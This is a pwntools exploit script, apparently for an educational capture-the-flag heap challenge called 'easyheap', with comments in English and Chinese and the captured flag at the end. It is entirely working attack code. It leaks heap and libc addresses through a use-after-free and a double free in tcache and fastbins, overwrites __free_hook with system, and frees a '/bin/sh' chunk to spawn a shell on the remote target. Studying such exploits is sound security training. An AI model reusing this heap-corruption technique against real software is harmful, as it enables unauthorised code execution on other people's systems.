from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#r = process('./easyheap')
r = remote('edu-ctf.zoolab.org', 30211)

cnt = 0
heap_base_addr = None
libc_base_addr = None

def show(leak=False):
    global heap_base_addr
    if not heap_base_addr and leak:
        heap_base_addr = int(r.recvlineS().strip().split('\t')[1], 10) - 0x10
    else:
        r.recvline()
    r.recvline()
    r.recvline()

def list_book(leak=False):
    r.recvuntil("> ")
    r.sendline(b"4")
    global cnt
    for i in range(cnt):
        r.recvline()
        show(leak)

def add(idx, length, name, price):
    r.recvuntil("> ")
    r.sendline(b"1")
    r.recvuntil(": ")
    r.sendline(idx)
    r.recvuntil(": ")
    r.sendline(length)
    r.recvuntil(": ")
    r.sendline(name)
    r.recvuntil(": ")
    r.sendline(price)
    global cnt
    cnt += 1
    r.recvline()
    show()

def delete(idx):
    r.recvuntil("> ")
    r.sendline(b"2")
    r.recvuntil(": ")
    r.sendline(idx)

def edit(idx, name, price):
    r.recvuntil("> ")
    r.sendline(b"3")
    r.recvuntil(": ")
    r.sendline(idx)
    r.recvuntil(": ")
    r.sendline(name)
    r.recvuntil(": ")
    r.sendline(price)
    r.recvline()
    show()

def find(idx):
    r.recvuntil("> ")
    r.sendline(b"5")
    r.recvuntil(": ")
    r.sendline(idx)
    global libc_base_addr
    if not libc_base_addr:
        tmpline = r.recvlineS().strip().split(' ')[1]
        if len(tmpline)>=6:
            tmpline += '\x00'*(8-len(tmpline))
            libc_base_addr = u64(tmpline)
    else:
        r.recvline()

def leave():
    r.recvuntil("> ")
    r.sendline(b"6")
    r.recvline()

# Leak libc base address may not work due to bad characters
# Try until it works
while not libc_base_addr:
    cnt = 0
    heap_base_addr = None
    libc_base_addr = None
    # 利用 UAF 去 leak tcache 的 key，得到 heap address
    # Choose size=32=0x20 so the chunk of name and the chunk of book will be in the same tcache entry
    # One delete will cause two free and insert two chunks into same tcachebin entry
    for i in range(3):
        add(str(i), "32", "dummy"+str(i), str(i+10))
    # One chunk in tcache[0x30], one chunk in tcache[0x40]
    add("3", "48", "dummy3", "3")
    # One chunk in fastbin[0x30], one chunk in tcache[0x50]
    add("4", "64", "dummy3", "4")
    # One chunk in fastbin[0x30], one chunk in unsorted bin
    add("5", "1040", "dummy3", "5")
    # 由於 freed chunk 相鄰 top chunk 時會觸發 consolidate，因此多放一塊 chk 來避免
    add("6", "1040", "dummy4", "11")
    delete("0")
    list_book(True)
    print(f"heap base address: {hex(heap_base_addr)}")


    """
    books[idx] = (Book *) malloc(sizeof(Book));
    books[idx]->name = malloc(namelen);
    books[idx]->price = 0;
    books[idx]->index = idx;
    books[idx]->index = namelen;


    pwndbg> x/10gx 0x5650fefcb290
                    | meta data      |      | chunk size     |
    0x5650fefcb290: 0x0000000000000000      0x0000000000000031
                    | name address   |      | index = namelen|
    0x5650fefcb2a0: 0x00005650fefcb2d0      0x0000000000000020
                    | price          |      | namelen (never assigned)|
    0x5650fefcb2b0: 0x000000000000000a      0x0000000000000000
    """



    # Delete first four chunk (including delete("0") in previous step) and tcache(0x30) will be full
    # The next delete on chunk size = 0x30 will be in fastbin
    for i in range(1,6,1):
        delete(str(i))
    # Double free index=4
    delete("4")

    # Clean tcache (tcache is stack so we need to take it back in reverse order)
    # fastbin[0x30] -> book4 -> book5 -> book4(double free)
    # tcache[0x30] -> book3 -> book2 -> book2_name -> book1 -> book1_name -> book0 -> book0_name
    # tcache[0x40] -> book3_name
    # tcache[0x50] -> book4_name (Although we freed book4 twice, the second time book4_name is invalid address)
    # unsortedbin  -> book5_name

    """
    [chunk 4]
    0x557f1253b420: 0x0000000000000000      0x0000000000000031
                    [chunk 4 fd && chunk 4 name pointer]
    0x557f1253b430: [0x0000557f1253b4a0]      0x0000000000000040
    0x557f1253b440: 0x0000000000000004      0x0000000000000000
    [chunk 4 name]
    0x557f1253b450: 0x0000000000000000      0x0000000000000051
    0x557f1253b460: 0x0000000000000000      0x0000557f1253b010
    0x557f1253b470: 0x0000000000000000      0x0000000000000000
    0x557f1253b480: 0x0000000000000000      0x0000000000000000
    0x557f1253b490: 0x0000000000000000      0x0000000000000000
    [chunk 5 = chunk 4 fd]
    [4 name]
                    [chunk 5 metadata]      [chunk 5 size]
    0x557f1253b4a0: 0x0000000000000000      0x0000000000000031
                    [4 name                                     ]
    [0x557f1253b4a0]: 0x3030303030303030      0x3030303030303031
                    [chunk 5 name]          [ chunk 5 name_len]
    0x557f1253b4b0: 0x0000557f1253b4e0      0x0000000000000410
                    [4 name                                    ]
    0x557f1253b4b0: 0x3030303030303030      0x3030303030303030

    0x557f1253b4c0: 0x0000000000000000      0x0000000000000000
    [chunk 5 name]
    0x557f1253b4d0: 0x0000000000000000      0x0000000000000421
    0x557f1253b4e0: 0x00007fe5f5c6fbe0      0x00007fe5f5c6fbe0
    """
    # Modify name of book4, due to double free and heap overflow, we can change the metadata, size, name_addr and name_len
    # Since chunk 5 name is in unsorted bin it's fd is pointing to main_arena in libc
    # change the name_addr to 0x557f1253b4e0 = heap_base_addr+0x4e0 to make chunk 5 name points to chunk 5 name's fd
    # More over we now have arbitrary read/write at arbitrary address
    unsortedbin_fd_addr = heap_base_addr + 0x4e0
    payload = b'\x00'*8 + b'\x31'+b'\x00'*7 + p64(unsortedbin_fd_addr) + b'\x10\x04'+b'\x00'*6
    edit("4", payload, "4")

    find("5")
    if not libc_base_addr:
        r.close()
        r = process('./easyheap')
    else:
        libc_base_addr -= 0x1ebbe0

print(f"libc base address: {hex(libc_base_addr)}")

system_addr = libc_base_addr + elf.symbols['system']
__free_hook_addr = libc_base_addr + elf.symbols['__free_hook']
print(hex(system_addr))
print(hex(__free_hook_addr))

# write system address to __free_hook using the same technique for leaking libc base address
payload = b'\x00'*8 + b'\x31'+b'\x00'*7 + p64(__free_hook_addr) + b'\x10\x04'+b'\x00'*6
edit("4", payload, "4")
edit("5", p64(system_addr), "5")

# write some chunk name as "/bin/sh" and free it to invoke __free_hook(which is now system)
# To avoid corruption, I choose a size that is never used before
add("7", "100", "/bin/sh", "7")
delete("7")


r.interactive()
#FLAG{to_easy...}